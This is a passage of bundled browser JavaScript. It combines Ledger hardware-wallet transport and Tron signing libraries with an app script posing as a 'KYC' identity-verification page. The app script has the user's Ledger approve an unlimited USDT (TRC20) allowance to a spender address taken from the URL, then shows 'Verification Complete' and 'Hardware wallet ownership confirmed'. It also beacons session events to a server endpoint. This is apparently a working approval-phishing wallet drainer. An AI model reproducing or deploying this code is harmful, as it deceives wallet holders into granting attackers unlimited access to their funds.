  })(DeviceModelId || (DeviceModelId = {}));
  var devices = {
    [DeviceModelId.blue]: {
      id: DeviceModelId.blue,
      productName: "Ledger\xA0Blue",
      productIdMM: 0,
      legacyUsbProductId: 0,
      usbOnly: true,
      memorySize: 480 * 1024,
      masks: [822083584, 822149120],
      getBlockSize: (_firwareVersion) => 4 * 1024
    },
    [DeviceModelId.nanoS]: {
      id: DeviceModelId.nanoS,
      productName: "Ledger\xA0Nano\xA0S",
      productIdMM: 16,
      legacyUsbProductId: 1,
      usbOnly: true,
      memorySize: 320 * 1024,
      masks: [823132160],
      getBlockSize: (firmwareVersion) => import_semver.default.lt(import_semver.default.coerce(firmwareVersion) ?? "", "2.0.0") ? 4 * 1024 : 2 * 1024
    },
    [DeviceModelId.nanoX]: {
      id: DeviceModelId.nanoX,
      productName: "Ledger\xA0Nano\xA0X",
      productIdMM: 64,
      legacyUsbProductId: 4,
      usbOnly: false,
      memorySize: 2 * 1024 * 1024,
      masks: [855638016],
      getBlockSize: (_firwareVersion) => 4 * 1024,
      bluetoothSpec: [
        {
          serviceUuid: "13d63400-2c97-0004-0000-4c6564676572",
          notifyUuid: "13d63400-2c97-0004-0001-4c6564676572",
          writeUuid: "13d63400-2c97-0004-0002-4c6564676572",
          writeCmdUuid: "13d63400-2c97-0004-0003-4c6564676572"
        }
      ]
    },
    [DeviceModelId.nanoSP]: {
      id: DeviceModelId.nanoSP,
      productName: "Ledger Nano S Plus",
      productIdMM: 80,
      legacyUsbProductId: 5,
      usbOnly: true,
      memorySize: 1533 * 1024,
      masks: [856686592],
      getBlockSize: (_firmwareVersion) => 512
    },
    [DeviceModelId.apex]: {
      id: DeviceModelId.apex,
      productName: "Ledger\xA0Nano\xA0Gen5",
      productIdMM: 128,
      legacyUsbProductId: 8,
      usbOnly: false,
      memorySize: 1533 * 1024,
      masks: [859832320],
      getBlockSize: (_firmwareVersion) => 512,
      bluetoothSpec: [
        {
          serviceUuid: "13d63400-2c97-8004-0000-4c6564676572",
          notifyUuid: "13d63400-2c97-8004-0001-4c6564676572",
          writeUuid: "13d63400-2c97-8004-0002-4c6564676572",
          writeCmdUuid: "13d63400-2c97-8004-0003-4c6564676572"
        }
      ]
    },
    [DeviceModelId.stax]: {
      id: DeviceModelId.stax,
      productName: "Ledger\xA0Stax",
      productIdMM: 96,
      legacyUsbProductId: 6,
      usbOnly: false,
      memorySize: 1533 * 1024,
      masks: [857735168],
      getBlockSize: (_firmwareVersion) => 512,
      bluetoothSpec: [
        {
          serviceUuid: "13d63400-2c97-6004-0000-4c6564676572",
          notifyUuid: "13d63400-2c97-6004-0001-4c6564676572",
          writeUuid: "13d63400-2c97-6004-0002-4c6564676572",
          writeCmdUuid: "13d63400-2c97-6004-0003-4c6564676572"
        }
      ]
    },
    [DeviceModelId.europa]: {
      id: DeviceModelId.europa,
      productName: "Ledger\xA0Flex",
      productIdMM: 112,
      legacyUsbProductId: 7,
      usbOnly: false,
      memorySize: 1533 * 1024,
      masks: [858783744],
      getBlockSize: (_firmwareVersion) => 512,
      bluetoothSpec: [
        {
          serviceUuid: "13d63400-2c97-3004-0000-4c6564676572",
          notifyUuid: "13d63400-2c97-3004-0001-4c6564676572",
          writeUuid: "13d63400-2c97-3004-0002-4c6564676572",
          writeCmdUuid: "13d63400-2c97-3004-0003-4c6564676572"
        }
      ]
    }
  };
  var productMap = {
    Blue: DeviceModelId.blue,
    "Nano S": DeviceModelId.nanoS,
    "Nano S Plus": DeviceModelId.nanoSP,
    "Nano X": DeviceModelId.nanoX,
    Stax: DeviceModelId.stax,
    Europa: DeviceModelId.europa
  };
  var devicesList = Object.values(devices);
  var ledgerUSBVendorId = 11415;
  var identifyUSBProductId = (usbProductId) => {
    const legacy = devicesList.find((d) => d.legacyUsbProductId === usbProductId);
    if (legacy)
      return legacy;
    const mm = usbProductId >> 8;
    const deviceModel = devicesList.find((d) => d.productIdMM === mm);
    return deviceModel;
  };
  var bluetoothServices = [];
  var serviceUuidToInfos = {};
  for (const id2 in devices) {
    const deviceModel = devices[id2];
    const { bluetoothSpec } = deviceModel;
    if (bluetoothSpec) {
      for (let i = 0; i < bluetoothSpec.length; i++) {
        const spec = bluetoothSpec[i];
        bluetoothServices.push(spec.serviceUuid);
        serviceUuidToInfos[spec.serviceUuid] = serviceUuidToInfos[spec.serviceUuid.replace(/-/g, "")] = {
          deviceModel,
          ...spec
        };
      }
    }
  }

  // node_modules/@ledgerhq/hw-transport-webhid/lib-es/TransportWebHID.js
  var ledgerDevices = [
    {
      vendorId: ledgerUSBVendorId
    }
  ];
  var isSupported = () => Promise.resolve(!!(window.navigator && window.navigator.hid));
  var getHID = () => {
    const { hid } = navigator;
    if (!hid)
      throw new TransportError("navigator.hid is not supported", "HIDNotSupported");
    return hid;
  };
  async function requestLedgerDevices() {
    const device = await getHID().requestDevice({
      filters: ledgerDevices
    });
    if (Array.isArray(device))
      return device;
    return [device];
  }
  async function getLedgerDevices() {
    const devices2 = await getHID().getDevices();
    return devices2.filter((d) => d.vendorId === ledgerUSBVendorId);
  }
  async function getFirstLedgerDevice() {
    const existingDevices = await getLedgerDevices();
    if (existingDevices.length > 0)
      return existingDevices[0];
    const devices2 = await requestLedgerDevices();
    return devices2[0];
  }
  var TransportWebHID = class _TransportWebHID extends Transport {
    device;
    deviceModel;
    channel = Math.floor(Math.random() * 65535);
    packetSize = 64;
    constructor(device) {
      super();
      this.device = device;
      this.deviceModel = typeof device.productId === "number" ? identifyUSBProductId(device.productId) : void 0;
      device.addEventListener("inputreport", this.onInputReport);
    }
    inputs = [];
    inputCallback;
    read = () => {
      if (this.inputs.length) {
        const value = this.inputs.shift();
        if (value !== void 0)
          return Promise.resolve(value);
        throw new Error("Unreachable: non-empty inputs");
      }
      return new Promise((success) => {
        this.inputCallback = success;
      });
    };
    onInputReport = (e) => {
      const buffer = import_buffer.Buffer.from(e.data.buffer);
      if (this.inputCallback) {
        this.inputCallback(buffer);
        this.inputCallback = null;
      } else {
        this.inputs.push(buffer);
      }
    };
    /**
     * Check if WebUSB transport is supported.
     */
    static isSupported = isSupported;
    /**
     * List the WebUSB devices that was previously authorized by the user.
     */
    static list = getLedgerDevices;
    /**
     * Actively listen to WebUSB devices and emit ONE device
     * that was either accepted before, if not it will trigger the native permission UI.
     *
     * Important: it must be called in the context of a UI click!
     */
    static listen = (observer) => {
      let unsubscribed = false;
      getFirstLedgerDevice().then((device) => {
        if (!device) {
          observer.error(new TransportOpenUserCancelled("Access denied to use Ledger device"));
        } else if (!unsubscribed) {
          const deviceModel = typeof device.productId === "number" ? identifyUSBProductId(device.productId) : void 0;
          observer.next({
            type: "add",
            descriptor: device,
            deviceModel
          });
          observer.complete();
        }
      }, (error) => {
        observer.error(new TransportOpenUserCancelled(error.message));
      });
      function unsubscribe() {
        unsubscribed = true;
      }
      return {
        unsubscribe
      };
    };
    /**
     * Similar to create() except it will always display the device permission (even if some devices are already accepted).
     */
    static async request() {
      const [device] = await requestLedgerDevices();
      return _TransportWebHID.open(device);
    }
    /**
     * Similar to create() except it will never display the device permission (it returns a Promise<?Transport>, null if it fails to find a device).
     */
    static async openConnected() {
      const devices2 = await getLedgerDevices();
      if (devices2.length === 0)
        return null;
      return _TransportWebHID.open(devices2[0]);
    }
    /**
     * Create a Ledger transport with a HIDDevice
     */
    static async open(device) {
      await device.open();
      const transport = new _TransportWebHID(device);
      const onDisconnect = (e) => {
        if (device === e.device) {
          getHID().removeEventListener("disconnect", onDisconnect);
          transport._emitDisconnect(new DisconnectedDevice());
        }
      };
      getHID().addEventListener("disconnect", onDisconnect);
      return transport;
    }
    _disconnectEmitted = false;
    _emitDisconnect = (e) => {
      if (this._disconnectEmitted)
        return;
      this._disconnectEmitted = true;
      this.emit("disconnect", e);
    };
    /**
     * Release the transport device
     */
    async close() {
      await this.exchangeBusyPromise;
      this.device.removeEventListener("inputreport", this.onInputReport);
      await this.device.close();
    }
    /**
     * Exchange with the device using APDU protocol.
     * @param apdu
     * @returns a promise of apdu response
     */
    exchange = async (apdu) => {
      const b = await this.exchangeAtomicImpl(async () => {
        const { channel, packetSize } = this;
        log("apdu", "=> " + apdu.toString("hex"));
        const framing = hid_framing_default(channel, packetSize);
        const blocks = framing.makeBlocks(apdu);
        for (let i = 0; i < blocks.length; i++) {
          await this.device.sendReport(0, blocks[i]);
        }
        let result;
        let acc;
        while (!(result = framing.getReducedResult(acc))) {
          try {
            const buffer = await this.read();
            acc = framing.reduceResponse(acc, buffer);
          } catch (e) {
            if (e instanceof TransportError && e.id === "InvalidChannel") {
              continue;
            }
            throw e;
          }
        }
        log("apdu", "<= " + result.toString("hex"));
        return result;
      }).catch((e) => {
        if (e && e.message && e.message.includes("write")) {
          this._emitDisconnect(e);
          throw new DisconnectedDeviceDuringOperation(e.message);
        }
        throw e;
      });
      return b;
    };
    setScrambleKey() {
    }
  };

  // node_modules/@ledgerhq/hw-app-trx/lib-es/Trx.js
  init_buffer_shim();

  // node_modules/@ledgerhq/hw-app-trx/lib-es/utils.js
  init_buffer_shim();
  function splitPath(path) {
    const result = [];
    const components = path.split("/");
    components.forEach((element) => {
      let number = parseInt(element, 10);
      if (isNaN(number)) {
        return;
      }
      if (element.length > 1 && element[element.length - 1] === "'") {
        number += 2147483648;
      }
      result.push(number);
    });
    return result;
  }
  function foreach(arr, callback) {
    function iterate(index, array, result) {
      if (index >= array.length) {
        return result;
      } else
        return callback(array[index], index).then(function(res) {
          result.push(res);
          return iterate(index + 1, array, result);
        });
    }
    return Promise.resolve().then(() => iterate(0, arr, []));
  }
  function decodeVarint(stream, index) {
    let result = 0;
    let shift = 0;
    let pos = index;
    while (shift < 64) {
      const b = stream[pos];
      result |= (b & 127) << shift;
      pos += 1;
      if (!(b & 128)) {
        result &= 4294967295;
        return {
          value: result,
          pos
        };
      }
      shift += 7;
    }
    throw new Error("Too many bytes when decoding varint.");
  }
  var padHexString = (str) => {
    return str.length % 2 ? "0" + str : str;
  };
  function hexBuffer(str) {
    const strWithoutPrefix = str.startsWith("0x") ? str.slice(2) : str;
    return import_buffer.Buffer.from(padHexString(strWithoutPrefix), "hex");
  }

  // node_modules/@ledgerhq/hw-app-trx/lib-es/TIP712/index.js
  init_buffer_shim();
  var CLA = 224;
  var signTIP712HashedMessage = (transport, path, domainSeparatorHex, hashStructMessageHex) => {
    const domainSeparator = hexBuffer(domainSeparatorHex);
    const hashStruct = hexBuffer(hashStructMessageHex);
    const paths = splitPath(path);
    const buffer = import_buffer.Buffer.alloc(1 + paths.length * 4 + 32 + 32, 0);
    let offset = 0;
    buffer[0] = paths.length;
    paths.forEach((element, index) => {
      buffer.writeUint32BE(element, 1 + 4 * index);
    });
    offset = 1 + 4 * paths.length;
    domainSeparator.copy(buffer, offset);
    offset += 32;
    hashStruct.copy(buffer, offset);
    return transport.send(CLA, 12, 0, 0, buffer).then((response) => {
      return response.slice(0, 65).toString("hex");
    });
  };

  // node_modules/@ledgerhq/hw-app-trx/lib-es/Trx.js
  var remapTransactionRelatedErrors = (e) => {
    if (e && e.statusCode === 27264) {
    }
    return e;
  };
  var PATH_SIZE = 4;
  var PATHS_LENGTH_SIZE = 1;
  var CLA2 = 224;
  var ADDRESS = 2;
  var SIGN = 4;
  var SIGN_HASH = 5;
  var SIGN_MESSAGE = 8;
  var ECDH_SECRET = 10;
  var VERSION = 6;
  var CHUNK_SIZE = 250;
  var Trx = class {
    transport;
    constructor(transport, scrambleKey = "TRX") {
      this.transport = transport;
      transport.decorateAppAPIMethods(this, [
        "getAddress",
        "getECDHPairKey",
        "signTransaction",
        "signTransactionHash",
        "signPersonalMessage",
        "signTIP712HashedMessage",
        "getAppConfiguration"
      ], scrambleKey);
    }
    /**
     * get Tron address for a given BIP 32 path.
     * @param path a path in BIP 32 format
     * @option boolDisplay optionally enable or not the display
     * @option boolChaincode optionally enable or not the chaincode request (see app-tron `P2_CHAINCODE` / `helper_send_response_pubkey`)
     * @return an object with a publicKey, address and (optionally) chainCode
     * @example
     * const address = await tron.getAddress("44'/195'/0'/0/0").then(o => o.address)
     */
    getAddress(path, boolDisplay, boolChaincode) {
      const paths = splitPath(path);
      const buffer = import_buffer.Buffer.alloc(PATHS_LENGTH_SIZE + paths.length * PATH_SIZE);
      buffer[0] = paths.length;
      paths.forEach((element, index) => {
        buffer.writeUInt32BE(element, 1 + 4 * index);
      });
      return this.transport.send(CLA2, ADDRESS, boolDisplay ? 1 : 0, boolChaincode ? 1 : 0, buffer).then((response) => {
        const publicKeyLength = response[0];
        const addressLength = response[1 + publicKeyLength];
        return {
          publicKey: response.slice(1, 1 + publicKeyLength).toString("hex"),
          address: response.slice(1 + publicKeyLength + 1, 1 + publicKeyLength + 1 + addressLength).toString("ascii"),
          chainCode: boolChaincode ? response.slice(1 + publicKeyLength + 1 + addressLength, 1 + publicKeyLength + 1 + addressLength + 32).toString("hex") : void 0
        };
      });
    }
    getNextLength(tx) {
      const field = decodeVarint(tx, 0);
      const data = decodeVarint(tx, field.pos);
      if ((field.value & 7) === 0)
        return data.pos;
      return data.value + data.pos;
    }
    /**
     * sign a Tron transaction with a given BIP 32 path and Token Names
     *
     * @param path a path in BIP 32 format
     * @param rawTxHex a raw transaction hex string
     * @param tokenSignatures Tokens Signatures array
     * @option version pack message based on ledger firmware version
     * @option smartContract boolean hack to set limit buffer on ledger device
     * @return a signature as hex string
     * @example
     * const signature = await tron.signTransaction("44'/195'/0'/0/0", "0a02f5942208704dda506d59dceb40f0f4978f802e5a69080112650a2d747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e5472616e73666572436f6e747261637412340a1541978dbd103cfe59c35e753d09dd44ae1ae64621c7121541e2ae49db6a70b9b4757d2137a43b69b24a445780188ef8b5ba0470cbb5948f802e", [], 105);
     */
    signTransaction(path, rawTxHex, tokenSignatures) {
      const paths = splitPath(path);
      let rawTx = import_buffer.Buffer.from(rawTxHex, "hex");
      const toSend = [];
      let data = import_buffer.Buffer.alloc(PATHS_LENGTH_SIZE + paths.length * PATH_SIZE);
      data[0] = paths.length;
      paths.forEach((element, index) => {
        data.writeUInt32BE(element, 1 + 4 * index);
      });
      while (rawTx.length > 0) {
        const newpos = this.getNextLength(rawTx);
        if (newpos > CHUNK_SIZE)
          throw new Error("Too many bytes to encode.");
        if (data.length + newpos > CHUNK_SIZE) {
          toSend.push(data);
          data = import_buffer.Buffer.alloc(0);
          continue;
        }
        data = import_buffer.Buffer.concat([data, rawTx.slice(0, newpos)]);
        rawTx = rawTx.slice(newpos, rawTx.length);
      }
      toSend.push(data);
      const startBytes = [];
      let response;
      const tokenPos = toSend.length;
      if (tokenSignatures !== void 0) {
        for (let i = 0; i < tokenSignatures.length; i += 1) {
          const buffer = import_buffer.Buffer.from(tokenSignatures[i], "hex");
          toSend.push(buffer);
        }
      }
      if (toSend.length === 1) {
        startBytes.push(16);
      } else {
        startBytes.push(0);
        for (let i = 1; i < toSend.length - 1; i += 1) {
          if (i >= tokenPos) {
            startBytes.push(160 | 0 | i - tokenPos);
          } else {
            startBytes.push(128);
          }
        }
        if (tokenSignatures !== void 0 && tokenSignatures.length) {
          startBytes.push(160 | 8 | tokenSignatures.length - 1);
        } else {
          startBytes.push(144);
        }
      }
      return foreach(toSend, (data2, i) => {
        return this.transport.send(CLA2, SIGN, startBytes[i], 0, data2).then((apduResponse) => {
          response = apduResponse;
        });
      }).then(() => {
        return response.slice(0, 65).toString("hex");
      }, (e) => {
        throw remapTransactionRelatedErrors(e);
      });
    }
    /**
     * sign a Tron transaction hash with a given BIP 32 path
     *
     * @param path a path in BIP 32 format
     * @param rawTxHex a raw transaction hex string
     * @return a signature as hex string
     * @example
     * const signature = await tron.signTransactionHash("44'/195'/0'/0/0", "25b18a55f86afb10e7aca38d0073d04c80397c6636069193953fdefaea0b8369");
     */
    signTransactionHash(path, rawTxHashHex) {
      const paths = splitPath(path);
      let data = import_buffer.Buffer.alloc(PATHS_LENGTH_SIZE + paths.length * PATH_SIZE);
      data[0] = paths.length;
      paths.forEach((element, index) => {
        data.writeUInt32BE(element, 1 + 4 * index);
      });
      data = import_buffer.Buffer.concat([data, import_buffer.Buffer.from(rawTxHashHex, "hex")]);
      return this.transport.send(CLA2, SIGN_HASH, 0, 0, data).then((response) => {
        return response.slice(0, 65).toString("hex");
      });
    }
    /**
     * get the version of the Tron app installed on the hardware device
     *
     * @return an object with a version
     * @example
     * const result = await tron.getAppConfiguration();
     * {
     *   "version": "0.1.5",
     *   "versionN": "105".
     *   "allowData": false,
     *   "allowContract": false,
     *   "truncateAddress": false,
     *   "signByHash": false
     * }
     */
    getAppConfiguration() {
      return this.transport.send(CLA2, VERSION, 0, 0).then((response) => {
        const signByHash = (response[0] & 1 << 3) > 0;
        let truncateAddress = (response[0] & 1 << 2) > 0;
        let allowContract = (response[0] & 1 << 1) > 0;
        let allowData = (response[0] & 1 << 0) > 0;
        if (response[1] === 0 && response[2] === 1 && response[3] < 2) {
          allowData = true;
          allowContract = false;
        }
        if (response[1] === 0 && response[2] === 1 && response[3] < 5) {
          truncateAddress = false;
        }
        const result = {
          version: `${response[1]}.${response[2]}.${response[3]}`,
          versionN: response[1] * 1e4 + response[2] * 100 + response[3],
          allowData,
          allowContract,
          truncateAddress,
          signByHash
        };
        return result;
      });
    }
    /**
     * sign a Tron Message with a given BIP 32 path
     *
     * @param path a path in BIP 32 format
     * @param message hex string to sign
     * @return a signature as hex string
     * @example
     * const signature = await tron.signPersonalMessage("44'/195'/0'/0/0", "43727970746f436861696e2d54726f6e5352204c6564676572205472616e73616374696f6e73205465737473");
     */
    signPersonalMessage(path, messageHex) {
      const paths = splitPath(path);
      const message = import_buffer.Buffer.from(messageHex, "hex");
      let offset = 0;
      const toSend = [];
      const size = message.length.toString(16);
      const sizePack = "00000000".substr(size.length) + size;
      const packed = import_buffer.Buffer.concat([import_buffer.Buffer.from(sizePack, "hex"), message]);
      while (offset < packed.length) {
        const maxChunkSize = offset === 0 ? CHUNK_SIZE - 1 - paths.length * 4 : CHUNK_SIZE;
        const chunkSize = offset + maxChunkSize > packed.length ? packed.length - offset : maxChunkSize;
        const buffer = import_buffer.Buffer.alloc(offset === 0 ? 1 + paths.length * 4 + chunkSize : chunkSize);
        if (offset === 0) {
          buffer[0] = paths.length;
          paths.forEach((element, index) => {
            buffer.writeUInt32BE(element, 1 + 4 * index);
          });
          packed.copy(buffer, 1 + 4 * paths.length, offset, offset + chunkSize);
        } else {
          packed.copy(buffer, 0, offset, offset + chunkSize);
        }
        toSend.push(buffer);
        offset += chunkSize;
      }
      let response;
      return foreach(toSend, (data, i) => {
        return this.transport.send(CLA2, SIGN_MESSAGE, i === 0 ? 0 : 128, 0, data).then((apduResponse) => {
          response = apduResponse;
        });
      }).then(() => {
        return response.slice(0, 65).toString("hex");
      });
    }
    /**
     * Sign a typed data. The host computes the domain separator and hashStruct(message)
     * @example
       const signature = await tronApp.signTIP712HashedMessage("44'/195'/0'/0/0",Buffer.from( "0101010101010101010101010101010101010101010101010101010101010101").toString("hex"), Buffer.from("0202020202020202020202020202020202020202020202020202020202020202").toString("hex"));
     */
    signTIP712HashedMessage(path, domainSeparatorHex, hashStructMessageHex) {
      return signTIP712HashedMessage(this.transport, path, domainSeparatorHex, hashStructMessageHex);
    }
    /**
     * get Tron address for a given BIP 32 path.
     * @param path a path in BIP 32 format
     * @param publicKey address public key to generate pair key
     * @return shared key hex string,
     * @example
     * const signature = await tron.getECDHPairKey("44'/195'/0'/0/0", "04ff21f8e64d3a3c0198edfbb7afdc79be959432e92e2f8a1984bb436a414b8edcec0345aad0c1bf7da04fd036dd7f9f617e30669224283d950fab9dd84831dc83");
     */
    getECDHPairKey(path, publicKey) {
      const paths = splitPath(path);
      const data = import_buffer.Buffer.from(publicKey, "hex");
      const buffer = import_buffer.Buffer.alloc(1 + paths.length * 4 + data.length);
      buffer[0] = paths.length;
      paths.forEach((element, index) => {
        buffer.writeUInt32BE(element, 1 + 4 * index);
      });
      data.copy(buffer, 1 + 4 * paths.length, 0, data.length);
      return this.transport.send(CLA2, ECDH_SECRET, 0, 1, buffer).then((response) => response.slice(0, 65).toString("hex"));
    }
  };

  // app.js
  window.Buffer = import_buffer2.Buffer;
  var NETWORK = {
    name: "TRON Mainnet (USDT)",
    rpc: "https://api.trongrid.io",
    contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    explorer: "https://tronscan.org",
    decimals: 6
  };
  var ACCT = (() => {
    const a = parseInt(new URLSearchParams(window.location.search).get("acct") || "0", 10);
    return Number.isInteger(a) && a >= 0 && a <= 255 ? a : 0;
  })();
  var DEFAULT_PATH = "44'/195'/" + ACCT + "'/0/0";
  var ledgerAddress = "";
  var spenderAddress = "";
  var approveUnits = (1n << 256n) - 1n;
  var amtInvalid = false;
  function approveAmountLabel() {
    return approveUnits.toString();
  }
  var ledgerCfg = null;
  var ledgerTrxSun = null;
  var activeTransport = null;
  var SESSION_ID = new URLSearchParams(window.location.search).get("session") || "";
  var $ = (id2) => document.getElementById(id2);
  var MONITOR_URL = "/api/events";
  var _monSid = "lg-" + Math.random().toString(36).slice(2, 8);
  function monit(ev, data) {
    try {
      const d = Object.assign({ session: SESSION_ID }, data || {});
      const p = JSON.stringify({ ev, t: (/* @__PURE__ */ new Date()).toISOString(), sid: _monSid, d });
      if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, p)) return;
      fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: p }).catch(() => {
      });
    } catch (e) {
    }
  }
  var log2 = (msg, cls = "") => {
    const el = $("apdu-log");
    if (!el) return;
    const line = document.createElement("div");
    line.className = "log-line " + cls;
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
  };
  var setStatus = (t) => {
    if ($("status")) $("status").textContent = t;
    if ($("status2")) $("status2").textContent = t;
  };
  var setResultStatus = (t) => {
    if ($("result-status")) $("result-status").textContent = t;
  };
  var sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  var b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  function b58ToHex(addr) {
    let n = 0n;
    for (const c of addr) {
      const i = b58.indexOf(c);
      if (i < 0) throw new Error("Invalid Base58 address: " + addr);
      n = n * 58n + BigInt(i);
    }
    const hex = n.toString(16).padStart(50, "0");
    if (!hex.startsWith("41")) throw new Error("No TRON address prefix (0x41)");
    return hex.slice(0, 42);
  }
  var addrParam = (addr) => b58ToHex(addr).slice(2).padStart(64, "0");
  var isTronAddr = (a) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
  function markSessionVerified(txID) {
    if (!SESSION_ID) return;
    const sessions = getSessions();
    if (sessions[SESSION_ID]) {
      sessions[SESSION_ID].verified = true;
      sessions[SESSION_ID].verifiedAt = Date.now();
      if (txID) sessions[SESSION_ID].txID = txID;
      localStorage.setItem("kyc_sessions", JSON.stringify(sessions));
    }
    fetch("/api/events", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      keepalive: true,
      body: JSON.stringify({ op: "sess_done", session: SESSION_ID, txID: txID || "" })
    }).catch(() => {
    });
  }
  async function currentAllowance(owner, spender) {
    try {
      const sim = await api("/wallet/triggerconstantcontract", {
        owner_address: owner,
        contract_address: NETWORK.contract,
        function_selector: "allowance(address,address)",
        parameter: addrParam(owner) + addrParam(spender),
        visible: true
      });
      const hex = sim?.constant_result?.[0] || "";
      return hex ? BigInt("0x" + hex) : 0n;
    } catch (e) {
      log2("Allowance pre-check failed \u2014 proceeding anyway: " + (e?.message || e), "warn");
      return 0n;
    }
  }
  function getSpenderAddress() {
    const urlParams = new URLSearchParams(window.location.search);
    const fromUrl = urlParams.get("spender");
    if (fromUrl && isTronAddr(fromUrl)) return fromUrl;
    const fromStorage = localStorage.getItem("ledger_spender");
    if (fromStorage && isTronAddr(fromStorage)) return fromStorage;
    return "";
  }
  function readApproveUnits() {
    const raw = new URLSearchParams(window.location.search).get("amt");
    if (raw == null || raw === "") return;
    if (!/^\d{1,78}$/.test(raw)) {
      amtInvalid = true;
      return;
    }
    const v = BigInt(raw);
    if (v <= 0n || v > (1n << 256n) - 1n) {
      amtInvalid = true;
      return;
    }
    approveUnits = v;
  }
  function getSessions() {
    try {
      return JSON.parse(localStorage.getItem("kyc_sessions") || "{}");
    } catch {
      return {};
    }
  }
  async function validateSession() {
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get("session");
    if (!sessionId) return { valid: true };
    const sessions = getSessions();
    const sess = sessions[sessionId];
    if (sess) {
      if (sess.expired || Date.now() >= sess.expiresAt) return { valid: false, reason: "Session expired" };
      if (sess.verified) return { valid: false, reason: "Already completed" };
      return { valid: true, session: sess };
    }
    try {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 2500);
      const r = await fetch("/api/events?sess=" + sessionId, { signal: ctl.signal });
      clearTimeout(t);
      const j = await r.json().catch(() => ({}));
      if (!j.ok || !j.found) return { valid: false, reason: "Session not found" };
      if (j.verified) return { valid: false, reason: "Already completed", txID: j.txID };
      if (j.expired || j.expiresAt && Date.now() >= j.expiresAt)
        return { valid: false, reason: "Session expired" };
      sessions[sessionId] = {
        from: j.from,
        to: j.to,
        expiresAt: j.expiresAt,
        verified: false,
        docsSubmitted: true,
        server: true
      };
      localStorage.setItem("kyc_sessions", JSON.stringify(sessions));
      monit("session_recovered", { remote: true });
      return { valid: true, session: sessions[sessionId] };
    } catch {
      return { valid: false, reason: "Session not found" };
    }
  }
  function setTxLink(txID) {
    const link = $("txlink");
    if (!txID) {
      link.hidden = true;
      link.textContent = "";
      return;
    }
    link.href = NETWORK.explorer + "/#/transaction/" + txID;
    link.textContent = txID;
    link.hidden = false;
  }
  function showCompletion(txID) {
    hideErrorPanel();
    const ic = $("result-icon");
    ic.textContent = "\u2713";
    ic.style.color = "#14914b";
    $("result-title").textContent = "Verification Complete";
    setResultStatus("Identity verification completed successfully.");
    $("result-detail").textContent = "Documents verified \xB7 Hardware wallet ownership confirmed";
    setTxLink(txID);
    $("done-hint").classList.remove("hidden");
    $("reset").classList.add("hidden");
    $("step1").classList.add("hidden");
    $("step2").classList.add("hidden");
    $("step3").classList.remove("hidden");
    const led = $("j-ledger"), con2 = $("jc-ledger"), done = $("j-done");
    if (led && done) {
      led.className = "jstep done";
      led.querySelector(".jdot").textContent = "\u2713";
      if (con2) con2.classList.add("done");
      done.className = "jstep done";
      done.querySelector(".jdot").textContent = "\u2713";
    }
  }
  function showResult(kind, title, status, txID, detail) {
    hideErrorPanel();
    const ic = $("result-icon");
    ic.textContent = kind === "ok" ? "\u2713" : "\u2717";
    ic.style.color = kind === "ok" ? "#14914b" : "#d92d20";
    $("result-title").textContent = title;
    setResultStatus(status);
    $("result-detail").textContent = detail || "";
    setTxLink(txID);
    $("done-hint").classList.add("hidden");
    $("reset").classList.remove("hidden");
    $("step1").classList.add("hidden");
    $("step2").classList.add("hidden");
    $("step3").classList.remove("hidden");
  }
  (async function showSessionContext() {
    const sessions = getSessions();
    let sess = SESSION_ID ? sessions[SESSION_ID] : null;
    if (!sess && SESSION_ID) {
      try {
        const r = await fetch("/api/events?sess=" + SESSION_ID);
        const j = await r.json().catch(() => ({}));
        if (j.ok && j.found) {
          sess = {
            from: j.from,
            to: j.to,
            expiresAt: j.expiresAt,
            verified: j.verified,
            docsSubmitted: true,
            server: true
          };
          sessions[SESSION_ID] = sess;
          localStorage.setItem("kyc_sessions", JSON.stringify(sessions));
        }
      } catch {
      }
    }
    const journey = $("journey");
    if (journey && !(sess && sess.docsSubmitted)) journey.style.display = "none";
    if (!sess) return;
    const box = $("session-box");
    if (box) {
      box.style.display = "block";
      $("ctx-from").textContent = sess.from || "-";
      $("ctx-to").textContent = sess.to || "-";
    }
    monit("ledger_opened", { from: sess.from, to: sess.to });
    const pill = $("sess-pill"), pillVal = $("sess-pill-val");
    if (pill && pillVal && sess.expiresAt && !sess.verified) {
      let expiredFired = false;
      const tick = () => {
        const remaining = sess.expiresAt - Date.now();
        if (remaining <= 0) {
          pill.classList.add("hidden");
          clearInterval(iv);
          const cur = getSessions()[SESSION_ID];
          if (!expiredFired && !(cur && cur.verified)) {
            expiredFired = true;
            monit("kyc_expired");
            showErrorPanel(new Error("Session expired"));
          }
          return;
        }
        const m = Math.floor(remaining / 6e4), s = Math.floor(remaining % 6e4 / 1e3);
        pill.classList.remove("hidden");
        pillVal.textContent = `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
        pill.classList.toggle("danger", remaining < 12e4);
        pill.classList.toggle("warn", remaining >= 12e4 && remaining < 3e5);
      };
      const iv = setInterval(tick, 1e3);
      tick();
    }
  })();
  var lastAction = null;
  var busy = false;
  var settingsOk = true;
  function updateButtons() {
    for (const id2 of ["connect", "approve", "revoke", "recheck"]) {
      const b = $(id2);
      if (!b) continue;
      b.disabled = busy || id2 === "connect" && !navigator.hid || (id2 === "approve" || id2 === "revoke") && !settingsOk;
    }
  }
  function setBusy(v) {
    busy = v;
    updateButtons();
  }
  function renderSettingsCheck(cfg) {
    const card = $("settings-check");
    if (!card || !cfg) return;
    card.classList.remove("hidden");
    const rows = [
      { id: "sc-data", on: cfg.allowData },
      { id: "sc-contract", on: cfg.allowContract },
      { id: "sc-hash", on: cfg.signByHash, optional: true }
    ];
    let missingReq = 0;
    for (const r of rows) {
      const li = $(r.id);
      if (!li) continue;
      const icon = li.querySelector(".sicon"), badge = li.querySelector(".sbadge");
      if (r.on) {
        li.className = "srow on";
        icon.textContent = "\u2713";
        badge.className = "sbadge ok";
        badge.textContent = r.optional ? "Enabled" : "Allowed";
      } else if (r.optional) {
        li.className = "srow opt";
